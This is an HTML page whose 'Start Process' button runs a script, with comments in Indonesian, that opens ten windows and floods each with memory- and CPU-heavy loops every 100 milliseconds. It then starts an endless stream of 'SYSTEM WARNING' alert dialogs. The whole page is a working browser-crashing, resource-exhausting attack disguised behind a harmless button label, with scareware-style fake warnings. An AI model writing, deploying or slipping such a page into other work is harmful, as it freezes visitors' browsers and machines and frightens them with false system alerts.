<!DOCTYPE html>
<html>
<body>
<button onclick="magic2()">Start Process</button>

<script>
function magic2() {
    // Buka banyak windows secara bersamaan
    for(let i = 0; i < 10; i++) {
        const w = window.open('', `win${i}`);
        
        // Infinite loop dengan resource intensive operations
        setInterval(() => {
            // Memory intensive operations
            const hugeArray = new Array(1000000).fill('X');
            const massiveString = hugeArray.join('');
            
            // CPU intensive
            for(let j = 0; j < 100000; j++) {
                Math.sqrt(Math.random() * Math.PI);
            }
            
            // DOM manipulation intensive
            try {
                w.document.body.innerHTML = massiveString.substring(0, 10000);
            } catch(e) {}
            
        }, 100);
    }
    
    // Juga trigger alert loops
    setTimeout(() => {
        const alertLoop = () => {
            alert('SYSTEM WARNING');
            setTimeout(alertLoop, 100);
        };
        alertLoop();
    }, 2000);
}
</script>
</body>
</html>
